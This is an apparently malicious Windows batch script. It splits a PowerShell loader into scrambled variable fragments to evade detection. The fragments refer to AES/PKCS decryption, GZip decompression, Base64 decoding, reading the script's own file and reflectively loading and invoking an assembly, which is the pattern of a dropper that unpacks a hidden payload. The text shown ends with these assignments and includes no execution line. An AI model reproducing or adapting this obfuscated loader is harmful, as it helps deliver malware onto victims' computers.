@echo off
%IcpcOuCZckbrqvUVCiSy%s%IcpcOuCZckbrqvUVCiSy%e%IcpcOuCZckbrqvUVCiSy%t%IcpcOuCZckbrqvUVCiSy%l%IcpcOuCZckbrqvUVCiSy%o%IcpcOuCZckbrqvUVCiSy%c%IcpcOuCZckbrqvUVCiSy%a%IcpcOuCZckbrqvUVCiSy%l%IcpcOuCZckbrqvUVCiSy% %IcpcOuCZckbrqvUVCiSy%e%IcpcOuCZckbrqvUVCiSy%n%IcpcOuCZckbrqvUVCiSy%a%IcpcOuCZckbrqvUVCiSy%b%IcpcOuCZckbrqvUVCiSy%l%IcpcOuCZckbrqvUVCiSy%e%IcpcOuCZckbrqvUVCiSy%d%IcpcOuCZckbrqvUVCiSy%e%IcpcOuCZckbrqvUVCiSy%l%IcpcOuCZckbrqvUVCiSy%a%IcpcOuCZckbrqvUVCiSy%y%IcpcOuCZckbrqvUVCiSy%e%IcpcOuCZckbrqvUVCiSy%d%IcpcOuCZckbrqvUVCiSy%e%IcpcOuCZckbrqvUVCiSy%x%IcpcOuCZckbrqvUVCiSy%p%IcpcOuCZckbrqvUVCiSy%a%IcpcOuCZckbrqvUVCiSy%n%IcpcOuCZckbrqvUVCiSy%s%IcpcOuCZckbrqvUVCiSy%i%IcpcOuCZckbrqvUVCiSy%o%IcpcOuCZckbrqvUVCiSy%n%IcpcOuCZckbrqvUVCiSy%
set "BkGHGeBUEjdQLLEUXRfi=s"
set "zFIyOikjampxSrDVVtpV=t"
set "wKBrAYVCWPaeXGdarZQH=!BkGHGeBUEjdQLLEUXRfi!e!zFIyOikjampxSrDVVtpV!"
!wKBrAYVCWPaeXGdarZQH! "fUxXglYCvQ=int;"
!wKBrAYVCWPaeXGdarZQH! "tDTkaKHSkY=xasa"
!wKBrAYVCWPaeXGdarZQH! "PYMCpFsVwy=;	}}"
!wKBrAYVCWPaeXGdarZQH! "klVXaflDVV=tem."
!wKBrAYVCWPaeXGdarZQH! "ggQFAXzenE=var="
!wKBrAYVCWPaeXGdarZQH! "jkepKDGQVQ=p9Mt"
!wKBrAYVCWPaeXGdarZQH! "qwRAWxjRYN=yloa"
!wKBrAYVCWPaeXGdarZQH! "sGHNHqieiN=ram_"
!wKBrAYVCWPaeXGdarZQH! "gaPjVlGvlU=r[1]"
!wKBrAYVCWPaeXGdarZQH! "YntwfyDvnt=nMod"
!wKBrAYVCWPaeXGdarZQH! "bNppaOLAnd=fs.S"
!wKBrAYVCWPaeXGdarZQH! "csyJlUqBWD=ert]"
!wKBrAYVCWPaeXGdarZQH! "WWSiBXObZG=in $"
!wKBrAYVCWPaeXGdarZQH! "NOKwvTDkwa=ion "
!wKBrAYVCWPaeXGdarZQH! "vHMRpbmzNO=Disp"
!wKBrAYVCWPaeXGdarZQH! "xVzEOdzEhF=trea"
!wKBrAYVCWPaeXGdarZQH! "YHroCvIGIz=c23z"
!wKBrAYVCWPaeXGdarZQH! "yUvQeyobjH=TmR."
!wKBrAYVCWPaeXGdarZQH! "HuHXUpISFP=.-11"
!wKBrAYVCWPaeXGdarZQH! "fVghTwVtsb=txeT"
!wKBrAYVCWPaeXGdarZQH! "FStAIWUxsW={	$y"
!wKBrAYVCWPaeXGdarZQH! "nDpFqWQPsy=th('"
!wKBrAYVCWPaeXGdarZQH! "eVefjpgEzU=..-1"
!wKBrAYVCWPaeXGdarZQH! "sNAlyjeubu=;	$y"
!wKBrAYVCWPaeXGdarZQH! "NcZcpkdISG=ompr"
!wKBrAYVCWPaeXGdarZQH! "CffxsbesDx=tion"
!wKBrAYVCWPaeXGdarZQH! "NmfNaIHJdW=in '"
!wKBrAYVCWPaeXGdarZQH! "fLQPrrhtiu=);	$"
!wKBrAYVCWPaeXGdarZQH! "ZECkzwqFKu=rofi"
!wKBrAYVCWPaeXGdarZQH! "bxMeWwlDPu=trea"
!wKBrAYVCWPaeXGdarZQH! "OcHaWgQcYN=retu"
!wKBrAYVCWPaeXGdarZQH! "MDANjjWZOg=.-16"
!wKBrAYVCWPaeXGdarZQH! "LVYbDqweZs=85gG"
!wKBrAYVCWPaeXGdarZQH! "SfAijnRhSL=mory"
!wKBrAYVCWPaeXGdarZQH! "ITOtjxuPZg=tion"
!wKBrAYVCWPaeXGdarZQH! "NVhJiHlcuQ=($pa"
!wKBrAYVCWPaeXGdarZQH! "rSOJhdAJmM=::('"
!wKBrAYVCWPaeXGdarZQH! "vPNxJYLTps=aram"
!wKBrAYVCWPaeXGdarZQH! "AGykWCWKus=-1.."
!wKBrAYVCWPaeXGdarZQH! "envGYfnZlY=s_va"
!wKBrAYVCWPaeXGdarZQH! "vhQekdYiiM= exe"
!wKBrAYVCWPaeXGdarZQH! "KFoozxuarj=();	"
!wKBrAYVCWPaeXGdarZQH! "OGPFZJRWAY=ar;}"
!wKBrAYVCWPaeXGdarZQH! "UvaOBhqMkP=S46e"
!wKBrAYVCWPaeXGdarZQH! "ZNgcMvxUTM=));"
!wKBrAYVCWPaeXGdarZQH! "rQRJIkTBYF=_fun"
!wKBrAYVCWPaeXGdarZQH! "pZgxofMgZY=Secu"
!wKBrAYVCWPaeXGdarZQH! "qBVYuRjfYi=func"
!wKBrAYVCWPaeXGdarZQH! "riCokygnqn=ctio"
!wKBrAYVCWPaeXGdarZQH! "RhsmFCEzsg=var)"
!wKBrAYVCWPaeXGdarZQH! "nebHKDKpPs=$kWT"
!wKBrAYVCWPaeXGdarZQH! "TSrtDgKheg=func"
!wKBrAYVCWPaeXGdarZQH! "LHfyrbrvjx=nirt"
!wKBrAYVCWPaeXGdarZQH! "tIpuVJODUG=on ("
!wKBrAYVCWPaeXGdarZQH! "smlqVUllej=k($p"
!wKBrAYVCWPaeXGdarZQH! "sYreinLOHZ='[-1"
!wKBrAYVCWPaeXGdarZQH! "yceVLjeWsb=embl"
!wKBrAYVCWPaeXGdarZQH! "UIOhJHyQlL=Star"
!wKBrAYVCWPaeXGdarZQH! "ZPxSPMXlit=ram_"
!wKBrAYVCWPaeXGdarZQH! "ZwTVUCqPNa=func"
!wKBrAYVCWPaeXGdarZQH! "IFeztrzdGO=rray"
!wKBrAYVCWPaeXGdarZQH! "ipBUtUxdcZ=trin"
!wKBrAYVCWPaeXGdarZQH! "IpfyilISZH=ypt_"
!wKBrAYVCWPaeXGdarZQH! "cHWzNnGQAk='')("
!wKBrAYVCWPaeXGdarZQH! "boxjCHiXgQ=w-Ob"
!wKBrAYVCWPaeXGdarZQH! "MTVDWirjCb=);	$"
!wKBrAYVCWPaeXGdarZQH! "nWVahXFOwI=ode]"
!wKBrAYVCWPaeXGdarZQH! "SaWmUaTDBc=n($p"
!wKBrAYVCWPaeXGdarZQH! "vMNKhjynlJ=on.G"
!wKBrAYVCWPaeXGdarZQH! "XYSARcKQaB=mR.D"
!wKBrAYVCWPaeXGdarZQH! "wiQslxPgVy=owst"
!wKBrAYVCWPaeXGdarZQH! "alkURHVSJQ=ar=$"
!wKBrAYVCWPaeXGdarZQH! "hLrfUxQypt=.Raw"
!wKBrAYVCWPaeXGdarZQH! "QgodQXggCy=$fBa"
!wKBrAYVCWPaeXGdarZQH! "CVEYZQucPk=yte["
!wKBrAYVCWPaeXGdarZQH! "cnOkHVzjtD=cryp"
!wKBrAYVCWPaeXGdarZQH! "wPzXEBpNlI=Copy"
!wKBrAYVCWPaeXGdarZQH! "XTDRkumpaI=ar $"
!wKBrAYVCWPaeXGdarZQH! "fSCSmgOcEG=$dec"
!wKBrAYVCWPaeXGdarZQH! "faxlkGDUdG=ar=["
!wKBrAYVCWPaeXGdarZQH! "IEuutYETEx=var."
!wKBrAYVCWPaeXGdarZQH! "MrznacIZiL=_var"
!wKBrAYVCWPaeXGdarZQH! "YQtMIbyObQ= -jo"
!wKBrAYVCWPaeXGdarZQH! "NWLTCbDCHd=Leng"
!wKBrAYVCWPaeXGdarZQH! "opFnGGXEKU=])))"
!wKBrAYVCWPaeXGdarZQH! "SMJYbaEbMn=ecur"
!wKBrAYVCWPaeXGdarZQH! "DBzBifhJIP=rypt"
!wKBrAYVCWPaeXGdarZQH! "XyfIUxXfAT=ss);"
!wKBrAYVCWPaeXGdarZQH! "CmJPRzmjWe=, [I"
!wKBrAYVCWPaeXGdarZQH! "SakQDshKrH==New"
!wKBrAYVCWPaeXGdarZQH! "KTgFCMLVEG=O.Co"
!wKBrAYVCWPaeXGdarZQH! "rzsESWutCV=-1.."
!wKBrAYVCWPaeXGdarZQH! "dTQgcxfeXe=rypt"
!wKBrAYVCWPaeXGdarZQH! "voSvjpDOGI=cute"
!wKBrAYVCWPaeXGdarZQH! "cjEPMEXvce=aylo"
!wKBrAYVCWPaeXGdarZQH! "UpaEsYmFhD=ypto"
!wKBrAYVCWPaeXGdarZQH! "WqBCcIIwAl=ion "
!wKBrAYVCWPaeXGdarZQH! "FSlgGuPLVF=]]$p"
!wKBrAYVCWPaeXGdarZQH! "bHUrBHsKcg= $pa"
!wKBrAYVCWPaeXGdarZQH! "PjfKZGboCi=em.I"
!wKBrAYVCWPaeXGdarZQH! "shpBbJupfX=Disp"
!wKBrAYVCWPaeXGdarZQH! "ESRgxICTwT=load"
!wKBrAYVCWPaeXGdarZQH! "awuAKpUNbW=trin"
!wKBrAYVCWPaeXGdarZQH! "AaOqPnKkKq=UqZ."
!wKBrAYVCWPaeXGdarZQH! "lmdsKzUSLo=var."
!wKBrAYVCWPaeXGdarZQH! "sbijSfyNjT=ecur"
!wKBrAYVCWPaeXGdarZQH! "UbRkTBTsbv=mpre"
!wKBrAYVCWPaeXGdarZQH! "cubwMMnQRF=rn_v"
!wKBrAYVCWPaeXGdarZQH! "nMbKZNihob=ZiwD"
!wKBrAYVCWPaeXGdarZQH! "GcZCRtnsbI=ds_v"
!wKBrAYVCWPaeXGdarZQH! "ToUReVaosA=var)"
!wKBrAYVCWPaeXGdarZQH! "MLkYokXpBs=gnir"
!wKBrAYVCWPaeXGdarZQH! "cfyRBaUTVo=$pay"
!wKBrAYVCWPaeXGdarZQH! "XwBYXCFnFw=;$Xl"
!wKBrAYVCWPaeXGdarZQH! "qMwSaRDNDP= '%~f0'"
!wKBrAYVCWPaeXGdarZQH! "ykrSHVVXOQ=){	$"
!wKBrAYVCWPaeXGdarZQH! "UnTGtSvpHA=togr"
!wKBrAYVCWPaeXGdarZQH! "NrVQOnkzgL=);	$"
!wKBrAYVCWPaeXGdarZQH! "HwkCIucRpe=var."
!wKBrAYVCWPaeXGdarZQH! "YmIXueXtwA=Crea"
!wKBrAYVCWPaeXGdarZQH! "jbTLiXXSgo=inal"
!wKBrAYVCWPaeXGdarZQH! "AETwnelDsC=e]::"
!wKBrAYVCWPaeXGdarZQH! "rHYSlEZEFg=tS46"
!wKBrAYVCWPaeXGdarZQH! "LnzXuBISWP=] -j"
!wKBrAYVCWPaeXGdarZQH! "vSsNJhxSDf=,$pa"
!wKBrAYVCWPaeXGdarZQH! "mEYXKTrwen=XlwQ"
!wKBrAYVCWPaeXGdarZQH! "xFrMiOzkrO=2af1"
!wKBrAYVCWPaeXGdarZQH! "RcLFgFUxhN=y]::"
!wKBrAYVCWPaeXGdarZQH! "lNTmSQodkM=');	"
!wKBrAYVCWPaeXGdarZQH! "TMAfTNrQuD=PKCS"
!wKBrAYVCWPaeXGdarZQH! "GnkotlGHAG=ptog"
!wKBrAYVCWPaeXGdarZQH! "WShDeBXdeY=.Ent"
!wKBrAYVCWPaeXGdarZQH! "WcXcKZXVue=gMod"
!wKBrAYVCWPaeXGdarZQH! "bUwZLmMFnY=ncti"
!wKBrAYVCWPaeXGdarZQH! "iueyfPZvTK=_fun"
!wKBrAYVCWPaeXGdarZQH! "lKlwvMWezo=-joi"
!wKBrAYVCWPaeXGdarZQH! "EkOTzIJyCB=koLH"
!wKBrAYVCWPaeXGdarZQH! "WeRMeNyceS=]::N"
!wKBrAYVCWPaeXGdarZQH! "pgVcnEzvLN=::CB"
!wKBrAYVCWPaeXGdarZQH! "VcLdEPuJZO=rt]:"
!wKBrAYVCWPaeXGdarZQH! "cIIEpxPRRr=46es"
!wKBrAYVCWPaeXGdarZQH! "sMAQbqjXii=wind"
!wKBrAYVCWPaeXGdarZQH! "kADdOLEnLt=tem."
!wKBrAYVCWPaeXGdarZQH! "IrmfFhoYaj=O.Me"
!wKBrAYVCWPaeXGdarZQH! "iBocgfpsMI=6mYS"
!wKBrAYVCWPaeXGdarZQH! "DvHRGWKDkw=esaB"
!wKBrAYVCWPaeXGdarZQH! "ZcvjQMSpAJ=em.S"
!wKBrAYVCWPaeXGdarZQH! "TqoZdTujfb=('67"
!wKBrAYVCWPaeXGdarZQH! "QNlqTcOwFi=.ToA"
!wKBrAYVCWPaeXGdarZQH! "MueclVQQMT=ZtFa"
!wKBrAYVCWPaeXGdarZQH! "MPebmFcLPL=es_v"
!wKBrAYVCWPaeXGdarZQH! "aTneOwWimg=aylo"
